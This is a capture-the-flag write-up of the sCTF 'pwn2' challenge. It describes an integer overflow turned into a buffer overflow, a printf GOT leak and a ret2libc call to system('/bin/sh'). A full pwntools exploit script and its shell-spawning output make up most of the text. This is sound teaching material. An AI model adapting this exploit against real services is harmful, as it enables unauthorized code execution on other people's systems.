### Solved by superkojiman and Swappage

On to pwn2! When we connect to the service we're first prompted for the number of bytes we want to input. The maximum it will take is 32 bytes; anything greater will result is an error. After that, we're prompted for some input, and it basically reads in the number of bytes we specified earlier. 

The first vulnerability is an integer overflow. Entering a negative number results in tricking the binary into accepting a much larger value which will cause a buffer overflow:

```
# ./pwn2
How many bytes do you want me to read? -1
Ok, sounds good. Give me 4294967295 bytes of data!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

Half the battle won! The binary has NX, and we assumed that ASLR was enabled on the server. We decided to leak printf()'s address in libc by returning to printf@plt and making it print its GOT entry. Once we had printf()'s address, we used [libc-database](https://github.com/niklasb/libc-database) to identify the libc version and obtain printf()'s offset. 

With the offset obtained, subtracting that from the leaked address gave us libc's base address. Using libc-database, we got the offsets for system() and "/bin/sh", which allowed us to get their addresses by adding them to libc's base address. Everything we needed to execute system("/bin/sh") was ready, so we just set printf() to return to vuln() so we could overwrite EIP all over again, and this time return to system(). Here's the exploit: 

```python
#!/usr/bin/env python

from pwn import *
#r = remote("localhost", 2323)
r = remote("problems2.2016q1.sctf.io", 1338)

buf = ""
buf += "A"*48
buf += p32(0x08048370)           # printf@plt
buf += p32(0x0804852f)           # return to vuln()
buf += p32(0x08048702)           # str: .... %s ....
buf += p32(0x0804a00c)           # ptr to printf@got

print "++++ STAGE 1 ++++"

# send size of bytes to read
print r.recv()
r.sendline("-1")
print r.recv()

# send first stage payload to leak libc addr
# returns to printf@plt to leak addr of printf@got and getchar@got
print "Sending stage 1 payload: leak libc"
r.sendline(buf)
r.recv()
d = r.recv()    # get leaked addresses

# leaked printf@got
addr_printf  = u32(d[:4])
print "addr_printf ", hex(addr_printf)

# used libc-database to identify libc version, and obtain printf()'s offset
# ubuntu-trusty-i386-libc6 (id libc6_2.19-0ubuntu6.6_i386)
offset_printf  = 0x0004d280

# libc base address
libc_base = addr_printf - offset_printf
print "libc_base", hex(libc_base)

# libc-database found these offsets for system() and "/bin/sh"
system_addr = libc_base + 0x00040190
bin_sh_addr = libc_base + 0x160a24

print "system_addr", hex(system_addr)
print "/bin/sh addr", hex(bin_sh_addr)

print ""
print "++++ STAGE 2 ++++"

# stage 2, overwrite EIP all over again, but this time we have system("/bin/sh") to return to
buf = ""
buf += "A"*48
buf += p32(system_addr)
buf += "XXXX"
buf += p32(bin_sh_addr)

r.sendline("-1")
print r.recv()

print "Sending stage 2 payload: system(\"/bin/sh\")"
r.sendline(buf)
print r.recv()

print "VulnHub FTW!"
r.interactive()
```

And finally, the exploit in action returning the flag: 

```
# ./sploit.py
[+] Opening connection to problems2.2016q1.sctf.io on port 1338: Done
++++ STAGE 1 ++++
How many bytes do you want me to read?
Ok, sounds good. Give me 4294967295 bytes of data!

Sending stage 1 payload: leak libc
addr_printf  0xb7610280
libc_base 0xb75c3000
system_addr 0xb7603190
/bin/sh addr 0xb7723a24

++++ STAGE 2 ++++
Ok, sounds good. Give me 4294967295 bytes of data!

Sending stage 2 payload: system("/bin/sh")
You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x901`\xb7XXXX$:r\xb7

VulnHub FTW!
[*] Switching to interactive mode
$ id
uid=1001(pwn2) gid=1001(pwn2) groups=1001(pwn2)
$ ls
flag.txt
pwn2
$ cat flag.txt
sctf{r0p_70_th3_f1n1sh}
```
